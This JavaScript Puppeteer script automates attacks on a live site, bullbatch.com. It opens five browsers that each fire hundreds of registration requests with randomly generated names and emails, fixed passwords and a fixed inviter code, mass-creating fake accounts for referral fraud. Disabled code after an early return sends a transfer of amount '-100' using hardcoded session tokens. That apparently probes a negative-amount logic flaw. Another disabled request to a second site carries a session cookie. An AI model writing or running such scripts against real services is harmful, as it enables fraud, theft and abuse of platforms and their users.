import puppeteer from "puppeteer";

const BROWSERS = 5;

async function runBrowser(id) {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  const endpoint = "https://bullbatch.com/reg/AOsbceaelg"

  await page.goto(endpoint);

  await page.evaluate((browserId) => {
    let running = true;
    
    const THREADS = 1;
    const BATCHES = 300;

    async function send(i) {
      if (!running) return;
    
      let gottenCaptcha;
    
      const randomNumber = (n, time) => {
        if (n == 1) return Math.floor(1 + Math.random() * 9)
        if (n == 2 && time) return Math.floor(10 + Math.random() * 60)
          else if (!time) return Math.floor(10 + Math.random() * 99)
        if (n == 4) return Math.floor(1000 + Math.random() * 9999);
        Math.floor(10000 + Math.random() * 99999)
      };
    
      const generateUsername = () => {
        const chars = 'abcdefghijklmnopqrstuvwxyz';
        const ran = () => chars[Math.floor(Math.random() * chars.length)];
        const email = `${ran()}${ran()}${ran()}o${ran()}${ran()}${ran()}`;
        return email;
      }
    
      const generateEmail = () => {
        const chars = 'abcdefghijklmnopqrstuvwxyz';
        const ran = () => chars[Math.floor(Math.random() * chars.length)];
        const email = `${ran()}ao${ran()}${ran()}${ran()}${ran()}${Math.floor(randomNumber() / 1000)}%40gmail.com`
        return email;
      }
    
      function buildForm() {
        const fd = new FormData();
        fd.append("username", generateUsername());
        fd.append("phone", `70${randomNumber()}800`);
        fd.append("email", generateEmail());
        fd.append("password", "Gamby123");
        fd.append("confirm_password", "Gamby123");
        fd.append("referral_code", "d11da5b0");
        return fd;
      }
    
      const fd = buildForm();
    
      const getWithdrawalAmount = () => {
        let am = 10;
        const a = Math.floor(Math.random() * 20);
        if (a < 10) am = a + 10;
        else am = a
        return am;
      }
    
      const ref_code = 'OGpouwlwha';
      // AOsbceaelg
    
      const countries = ['Nigeria', 'Australia', 'Canada', 'Ghana', 'India', 'Kenya', 'Tanzania', 'Uganda', 'UK', 'USA'];
      const country = countries[Math.floor(Math.random() * countries.length)];
    
      const unix_timestamp = Math.floor(Date.now() / 1000);
    
      try {
        // const res = await fetch(endpoint, {
        //   method: "POST",
        //   agent,
        //   headers: {
        //     ...fd.getHeaders(),
        //     Cookie: 'PHPSESSID=r8kp1uq3smcuahd8vg0ll51qbr',
        //     Connection: "keep-alive"
        //   },
        //   body: fd
        // });
    
        const res = await fetch("https://bullbatch.com/register", {
          "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "priority": "u=1, i",
            "sec-ch-ua": "\"Chromium\";v=\"146\", \"Not-A.Brand\";v=\"24\", \"Microsoft Edge\";v=\"146\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "Referer": `https://bullbatch.com/reg/${ref_code}`
          },
          "body": `{\"fName\":\"Alex\",\"lName\":\"${generateUsername()}\",\"email\":\"${generateEmail()}\",\"password\":\"Creeper123#\",\"country\":\"${country}\",\"currency_format\":\"en-NG\",\"currency\":\"NGN\",\"date\":\"Mar 30 at 1:${randomNumber(2, true)} PM\",\"inviter\":\"OGpouwlwha\"}`,
          "method": "POST"
        });
    
        console.log(await res.json());
        console.log(`Try ${i + 1} -> ${res.status}`);
        return;
    
        const transferRes = await fetch("https://bullbatch.com/bullbatch_to_bullbatch", {
          "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "priority": "u=1, i",
            "sec-ch-ua": "\"Chromium\";v=\"146\", \"Not-A.Brand\";v=\"24\", \"Microsoft Edge\";v=\"146\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "cookie": "signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY5Y2E3MTliMGQzNTNlZGEzNTc3OGRkZCIsImlhdCI6MTc3NDg3NTAzNSwiZXhwIjoxNzc0OTYxNDM1fQ.n7QrGhsiGo_7bf_lXpRkSyS_5g1-XyQX6csgC1mN5gQ; _signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY5Y2E3MTliMGQzNTNlZGEzNTc3OGRkZCIsImlhdCI6MTc3NDg3NTA5Nn0.Sey5x5_vMvyl9coTsDwg9SqRcm_RmzZP2o5tZN52NvI",
            "Referer": "https://bullbatch.com/bullbatch_to_bullbatch"
          },
          "body": "{\"amount\":\"-100\",\"date\":\"Mar 30 at 2:46 PM\",\"public_id\":\"OGpouwlwha\"}",
          "method": "POST"
        });
    
        const res2 = await fetch("https://beefarm.top/dashboard.php", {
          "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundarytqsuwwmWO23P4oAc",
            "priority": "u=1, i",
            "sec-ch-ua": "\"Chromium\";v=\"146\", \"Not-A.Brand\";v=\"24\", \"Microsoft Edge\";v=\"146\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "cookie": "g_state={\"i_l\":0,\"i_ll\":1774116252257,\"i_b\":\"T6NbVPzdBHIB/OUmWRr/TlRhIDXEnWLadsAYlmeGP7w\",\"i_e\":{\"enable_itp_optimization\":0}}; PHPSESSID=af09c4dd4a6eb1a3da49cbc57122f71a",
            "Referer": "https://beefarm.top/dashboard.php"
          },
          "body": "------WebKitFormBoundarytqsuwwmWO23P4oAc\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\ncheck_membership\r\n------WebKitFormBoundarytqsuwwmWO23P4oAc--\r\n",
          "method": "POST"
        });
    
        return;
    
    
      } catch (err) {
        console.log(`❌ ${i + 1}`, err.message);
      }
    }
    
    (async () => {
      if (!running) return;
      for (let b = 0; b < BATCHES; b++) {
        console.log(`🚀 Burst ${b + 1}`);
        if (!running) return;
        await Promise.all(
          Array.from({ length: THREADS }, (_, i) => send(b * THREADS + i))
        );
      }
      console.log("🎯 Done");
    })();
  }, id);

  await new Promise(r => setTimeout(r, 60000));

  await browser.close();
}

await Promise.all(
  Array.from({ length: BROWSERS }, (_, i) => runBrowser(i))
);